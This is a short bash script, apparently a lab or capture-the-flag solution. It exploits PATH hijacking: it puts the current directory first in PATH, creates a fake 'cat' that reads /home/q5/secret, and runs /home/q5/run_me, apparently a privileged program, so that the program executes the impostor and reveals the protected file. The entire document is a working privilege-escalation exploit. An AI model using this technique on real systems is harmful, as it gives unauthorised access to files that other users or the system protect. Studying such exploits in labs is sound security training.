#!/bin/bash

# First cd to a directory with permission
cd ~/Public
echo $PATH
# It will give address list like /usr/local/bin: /usr/bin:
export PATH=.:$PATH
echo '#!/bin/bash' > cat
echo '/bin/cat /home/q5/secret' >> cat
chmod +x cat
/home/q5/run_me